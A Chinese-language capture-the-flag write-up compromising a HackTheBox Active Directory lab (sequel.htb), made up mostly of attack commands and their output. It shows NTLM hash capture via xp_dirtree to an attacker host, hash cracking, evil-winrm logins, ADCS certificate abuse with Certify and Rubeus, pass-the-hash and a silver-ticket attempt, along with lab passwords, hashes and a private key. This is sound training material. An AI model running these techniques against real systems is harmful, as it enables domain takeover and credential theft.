# README

## 信息收集

### nmap

```shell
sudo nmap -p- --min-rate 10000 10.10.11.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 15:06 CST
Nmap scan report for bogon (10.10.11.202)
Host is up (0.47s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49700/tcp open  unknown
49710/tcp open  unknown
49719/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.97 seconds

```



```shell
sudo nmap -p 53,88,135,139,389,445,464,593,636,1433,5985,9389 -sC -sV  10.10.11.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 15:07 CST
Nmap scan report for bogon (10.10.11.202)
Host is up (0.52s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-22 15:08:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap
|_ssl-date: 2023-09-22T15:09:50+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
|_ssl-date: 2023-09-22T15:09:49+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-09-22T15:09:48+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-09-22T14:58:04
|_Not valid after:  2053-09-22T14:58:04
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  adws?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-09-22T15:09:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.67 seconds

```

dc.sequel.htb
sequel.htb



### 53端口

```shell
dig axfr @10.10.11.202 dc.sequel.htb

; <<>> DiG 9.10.6 <<>> axfr @10.10.11.202 dc.sequel.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

```



### 135端口

```shell
rpcclient -U "" -N 10.10.11.202
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> exit

feng at fengs-MacBook-Pro.local in [~/github/CTF/Web/渗透/hackthebox/Reel/ftp]  on git:main ✗  987e539c "commit"
15:12:22 › rpcclient -U "guest" -N 10.10.11.202
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

```



### 389端口

```shell
ldapsearch -x -h 10.10.11.202  -b "dc=dc,dc=sequel,dc=htb" '(objectClass=person)'
# extended LDIF
#
# LDAPv3
# base <dc=dc,dc=sequel,dc=htb> with scope subtree
# filter: (objectClass=person)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this ope
 ration a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```





### 445端口

```shell
smbmap -H 10.10.11.202 -u ""

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB

feng at fengs-MacBook-Pro.local in [~/github/CTF/Web/渗透/hackthebox/Reel/ftp]  on git:main ✗  987e539c "commit"
15:12:50 › smbmap -H 10.10.11.202 -u "guest"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB
```

后来看了wp发现这边好像是靶机卡了。

再次试：

```shell
smbmap -H 10.10.11.202 -u "guest"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.10.11.202:445	Name: bogon
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Public                                            	READ ONLY
	SYSVOL                                            	NO ACCESS	Logon server share

```



```shell
smbclient //10.10.11.202/Public -U "guest"
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (6.4 KiloBytes/sec) (average 6.4 KiloBytes/sec)
```

获得了sql server的一个用户名密码：user PublicUser and password GuestUserCantWrite1 ，一个邮箱：brandon.brown@sequel.htb

并且说了一些信息，

> 自去年以来，我们的 SQL Server 发生了相当多的事故（看看你，Ryan，你的实例位于 DC，为什么要这样做）
> 你甚至在 DC 上放置了一个模拟实例？！）。 因此，汤姆认为编写一个关于如何访问和访问的基本过程是个好主意。
> 然后测试对数据库的任何更改。 当然，这一切都不会在实时服务器上完成，我们将 DC 模型克隆到
> 专用服务器。
> Tom 度假回来后会立即从 DC 中删除该实例。

### 88端口

没爆出什么有用的东西

### 1433端口

Microsoft SQL Server 2019 15.00.2000.00; RTM





```shell
python3.10 mssqlclient.py  'sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202'
```

看了下数据库发现只有默认库，xp_cmdshell也没有权限使用。学习到新的NTLM姿势：

```shell
sudo python2 Responder.py -i 10.10.14.14 -wrfv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:fc43c3cf9d892a59:DA1E50B737E201DD8658A6D76B21E981:0101000000000000C0653150DE09D201636DA589D7248772000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000473F89B23E1854B213BAAA60B3BD1FD6035630C5E4D855EB86994AE26263982F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310034000000000000000000


EXEC xp_dirtree '\\10.10.14.14\share', 1, 1
```



爆破：

```shell
hashcat -m 5600 hash.txt /Users/feng/many-ctf/rockyou.txt --force
SQL_SVC::sequel:fc43c3cf9d892a59:da1e50b737e201dd8658a6d76b21e981:0101000000000000c0653150de09d201636da589d7248772000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000473f89b23e1854b213baaa60b3bd1fd6035630c5e4d855eb86994ae26263982f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310034000000000000000000:REGGIE1234ronnie
```

得到SQL_SVC:REGGIE1234ronnie



## SQL_SVC用户

```shell
evil-winrm -i 10.10.11.202 -u SQL_SVC -p 'REGGIE1234ronnie'
```

除了sql_svc用户还有个Ryan.Cooper用户：

```
*Evil-WinRM* PS C:\> dir -force .\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d--hsl        9/15/2018  12:28 AM                All Users
d-rh--        7/20/2021  12:20 PM                Default
d--hsl        9/15/2018  12:28 AM                Default User
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
-a-hs-        9/15/2018  12:16 AM            174 desktop.ini
```

通过翻找，在SQL SERVER目录的log里面发现了可能的密码：

```shell
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```



NuclearMosquito3可能是密码。





## Ryan.Cooper用户

利用Ryan.Cooper:NuclearMosquito3登录成功

```shell
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

查看Ryan.Cooper:对象信息，发现属于Certificate Service DCOM Access组，因此可能存在ADCS服务。



利用Certify.exe工具：

```shell
 .\certify.exe find /vulnerable
 [!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.8715059
```





```shell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

```

得到

```shell

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzArUyXU84QEKYqvfY/MagHGnmNgWfnLh/xCLioAKnGtAKV4I
GV8hJzoepVL91md6tjW8MftUZIa5M7XsXFxUOmChZupxWXPykbduSvpr+33/tI3G
QzZSFLl+0cy/xO9OjUOmyD3Ehe+buibny17ddgHInz7CP5PCO+VUNGpYeXo2a1v5
4hNqM8qshs5N4A200uoOnWM5RakLho6j1P0Qwd2TcvijhvvSGGt/7vtTMj7J9Sis
Gp9GG1hSj04rKaEAgbZqPHymmLW+jZdN/a6CpIJKv0HfUu32hzjqBIZLbx5pu4qu
Vc/rVvT83pgcFvL2NQ4AZMxdhiOPg56T2DSQSQIDAQABAoIBADXqIsG8xcJaiQj7
i0KYyQbpgTSE3KS67HZ+Q7DsFmGwgTqtCwzRMyxvUguzOzl9DFK7Ligy1eDeLG+6
gWMCTotCX0OXbS4K0iyowG71brT8XSWzVJEL+HJbdWQwave5mBMBrj84+wW9A3QT
tanqPjBhVkalyaQNAgTbmv1ioFAwfwo5AA1PM+FMtQFEBr2vzkMqPY5vnYDA3PQ3
tpouMfkBKwN1i0kLTN+URWN2DFWsRgaS/ZnCDeNUDOlHw/4XAo23rxk5jS9zcZFd
HBYjvkSjDqJcghAH1AW2usQ3SBQ1FABMLQhk9s1iXuJsT8hQTgeCG+ZIEgWwo0x6
RihTTFUCgYEA47DQGIzdrF3XMrOChceBAO3owTCd2GkrA19TXJXIuviomsNcmMlD
G9ssXDYZ0XlOGB9jtzH6wocZ4h5ggQu8/st4aDur4V3WsapfXEZSNQB3tit6Ivg5
7rKFc+93J6Zo4EybyuR++b7CFZKtkhGJvm21MzniklUveCKT1LcrWLsCgYEA5WlP
9cIz0SKX1J+7XWUxNeIhNWgzUla6lodXgIS3xRmnoR20zrpA7NXSTm9Iqqk/DMS9
KdJH408l+DRs+Rr2qxYqqM2NfHebIt97sFOe/7aPUHrWw5NHrxvuEcO4ssJwUapr
AMOVo18l57apl/tjAP68wlcwc+ZzjUmw3tC2XMsCgYEAg4mxHo26vopT+Ul1PR39
a/EFhx40AkL3g3I9sX4iwclHdmkohGe5Kk2bOgZTMg3XTN5NeBcam+j6zgPokoSa
gcRAYk8exAq3LlqTzrYdZdtITWienbczmK9vo4OTHcfoTLRVSIhqxpMqgtYDCiCx
p96vUNG/D/TAgLHRH5FWLGMCgYAGOjScdDgZ3jmG4Qsh/uQ2FTxXicuS2Z3ZBjV+
3Jtsc0TUn8zPq8ilZSx/SpALaeq3OwPzhazD49shALNQk8XMYR6pVGMZ1NlWOgDO
iYaQZHFBewQnbPEONNDilJCH8bVA0kJzU9vVAnkx8AhsgrtuRHv1Po6nJsNOO4jc
k4fPvwKBgBsuwFmL7REtDywNJAApqB43a597qPbGVTXSVlbWIFvRlBQb8oN6n6Ih
sIys9RVWD0U8kHu1VPV8EFcnFHJAzQBzzwl8uF1kK8Whc7ekSEQX2Gu+ryLiVfWq
Gdh2IZ2n+AIau7U5uGZmoDOAcQeyvnPRe9TmzHFps8icm5eaR/JE
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAqLevrr+4dNZwAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwOTIyMTY1NjUyWhcNMjUwOTIy
MTcwNjUyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDMCtTJdTzhAQpiq99j8xqAcaeY
2BZ+cuH/EIuKgAqca0ApXggZXyEnOh6lUv3WZ3q2Nbwx+1RkhrkztexcXFQ6YKFm
6nFZc/KRt25K+mv7ff+0jcZDNlIUuX7RzL/E706NQ6bIPcSF75u6JufLXt12Acif
PsI/k8I75VQ0alh5ejZrW/niE2ozyqyGzk3gDbTS6g6dYzlFqQuGjqPU/RDB3ZNy
+KOG+9IYa3/u+1MyPsn1KKwan0YbWFKPTispoQCBtmo8fKaYtb6Nl039roKkgkq/
Qd9S7faHOOoEhktvHmm7iq5Vz+tW9PzemBwW8vY1DgBkzF2GI4+DnpPYNJBJAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFO96T2eypKwbYvgXThdw3JezToQx
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAbd/rVj33f6ydKrrF7NM9zfZrENaGbXqoydo6tefePSopiDurv1VumXcG
IhT43gich9khhdOGULof9UjuowdGYz0Qu61aY/lLCy8akYFslx+Z40w065s5dRw3
3NESRRREpJWQNYhFphlfc8W7YRWxxf3RI5Jysqis4u1GA1E0a1JX4AUSriwMsXVS
KfmuN/zfYGFoBqQxHxAMZGhhitIiwPUhbgcG+/uwjzn4a98afT+O0VTeAP3sNSk1
VZU4ikbwb4MzOgnEzeuCJgWZQttxbJkmP45fhpYLns1X1UoKLxvI1Y+PEUmB9qvt
7lD1qRQE1raoc4hLlKFMWV/QUHymYg==
-----END CERTIFICATE-----

```



保存下载：

```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

然后：

```shell
iwr -uri http://10.10.14.14:39554/cert.pfx -outfile cert.pfx
upload Rubeus.exe


.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```



得到administrator的NTLM hash：A52F78E4C751E5F5E17E1E9F3E58F4EE



## administrator

```shell
evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```











## 白银票据

另外一种攻击方法。把MSSQL当作SPN，制作白银票据以Administrator来访问MSSQL。



```shell
python2
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().encode('hex')

```

```shell
*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID


DomainSID : S-1-5-21-4078382237-1492182817-2568127209
```

域名是sqquel.htb，请求的用户是Administrator



```shell
python3.10 ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn feng/dc.sequel.htb administrator
KRB5CCNAME=administrator.ccache python3.10 mssqlclient.py -k dc.sequel.htb
```

讲道理应该能通的但是打不通。

















```powershell
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

$Password = ConvertTo-SecureString 'fengfeng123!!!' -AsPlainText -Force
New-MachineAccount -MachineAccount "FENG" -Password $($Password) -Domain "sequel.htb" -DomainController "dc.sequel.htb" -Verbose

Set-DomainObject -Identity "FENG$" -Set @{"dnsHostname" = "dc.sequel.htb"} -Verbose
```













